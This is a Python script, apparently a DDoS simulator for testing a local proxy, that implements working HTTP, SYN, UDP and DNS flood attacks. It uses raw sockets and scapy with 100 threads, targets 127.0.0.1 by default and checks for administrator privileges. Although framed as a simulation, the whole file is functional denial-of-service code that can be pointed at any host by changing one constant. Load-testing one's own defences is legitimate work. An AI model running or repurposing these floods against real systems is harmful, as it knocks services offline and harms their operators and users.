import socket
import threading
import time
import requests
import random
from scapy.all import IP, TCP, UDP, send, Raw
import os
import ctypes

# --- Configuration ---
SETTINGS_API_URL = "http://127.0.0.1:8001/api/settings"
# Note: The simulator now targets the proxy itself, not the origin server.
TARGET_IP = '127.0.0.1' 
TARGET_PORT = 80
THREAD_COUNT = 100

# --- NEW: Packet counter ---
packet_counter = 0
lock = threading.Lock()

# --- Attack Functions ---

def simulate_http_flood(target_ip, target_port):
    """Simulates a Layer 7 HTTP flood attack."""
    global packet_counter
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            # Send data in a loop within the same connection
            while True:
                request = b"GET / HTTP/1.1\r\nHost: localhost\r\nUser-Agent: AttackBot\r\n\r\n"
                s.sendall(request)
                with lock:
                    packet_counter += 1
                time.sleep(0.01)
        except ConnectionRefusedError:
            print("❌ Connection refused. Is the proxy server running on the target IP/port?")
            time.sleep(2)
        except Exception as e:
            # Catch other exceptions and print them
            print(f"❌ An error occurred in HTTP flood thread: {e}")
            time.sleep(2)
        finally:
            if 's' in locals():
                s.close()

def simulate_syn_flood(target_ip, target_port):
    """Simulates a Layer 4 SYN Flood attack."""
    global packet_counter
    while True:
        try:
            ip_packet = IP(dst=target_ip)
            tcp_packet = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
            send(ip_packet/tcp_packet, verbose=0)
            with lock:
                packet_counter += 1
            time.sleep(0.001)
        except Exception as e:
            print(f"❌ An error occurred in SYN flood thread: {e}")

def simulate_udp_flood(target_ip, target_port):
    """Simulates a Layer 4 UDP Flood with random data."""
    global packet_counter
    payload = random._urandom(1024)
    while True:
        try:
            packet = IP(dst=target_ip)/UDP(sport=random.randint(1024, 65535), dport=target_port)/Raw(load=payload)
            send(packet, verbose=0)
            with lock:
                packet_counter += 1
            time.sleep(0.001)
        except Exception as e:
            print(f"❌ An error occurred in UDP flood thread: {e}")

def simulate_dns_flood(target_ip):
    """Simulates a DNS query flood (volumetric attack on port 53)."""
    global packet_counter
    payload = b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\xff\x00\x01'
    while True:
        try:
            packet = IP(dst=target_ip)/UDP(sport=random.randint(1024, 65535), dport=53)/Raw(load=payload)
            send(packet, verbose=0)
            with lock:
                packet_counter += 1
            time.sleep(0.001)
        except Exception as e:
            print(f"❌ An error occurred in DNS flood thread: {e}")

# --- Main Execution ---
if __name__ == "__main__":
    # --- NEW: Check for administrator privileges on Windows ---
    is_admin = False
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

    if not is_admin:
        print("\n⚠️ WARNING: Script is not running with administrator privileges.")
        print("   SYN, UDP, and DNS floods may not work correctly.")
        print("   Please re-run this script from an Administrator terminal for best results.\n")

    print("\nSelect the type of DDoS attack to simulate:")
    print("1. HTTP Flood (Volumetric TCP)")
    print("2. SYN Flood (Protocol TCP)")
    print("3. UDP Flood (Volumetric UDP)")
    print("4. DNS Flood (Volumetric UDP on Port 53)")
    
    choice = input("Enter your choice (1-4): ")
    
    attack_function = None
    args = ()
    if choice == '1':
        attack_function = simulate_http_flood
        args = (TARGET_IP, TARGET_PORT)
    elif choice == '2':
        attack_function = simulate_syn_flood
        args = (TARGET_IP, TARGET_PORT)
    elif choice == '3':
        attack_function = simulate_udp_flood
        args = (TARGET_IP, 80) # Target a common web port
    elif choice == '4':
        attack_function = simulate_dns_flood
        args = (TARGET_IP,)
    else:
        print("Invalid choice. Exiting.")
        exit()

    print("\nStarting DDoS simulation...")
    print(f"Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"Attack Type: {attack_function.__name__}")
    print(f"Threads: {THREAD_COUNT}")
    print("Press Ctrl+C to stop the simulation.")

    threads = []
    for i in range(THREAD_COUNT):
        thread = threading.Thread(target=attack_function, args=args)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    try:
        last_count = 0
        while True:
            time.sleep(2)
            with lock:
                current_count = packet_counter
            
            # --- NEW: Print packets per second ---
            rate = (current_count - last_count) / 2
            print(f"🚀 Sending packets... Rate: {rate:.2f} packets/sec")
            last_count = current_count

    except KeyboardInterrupt:
        print("\nSimulation stopped.")
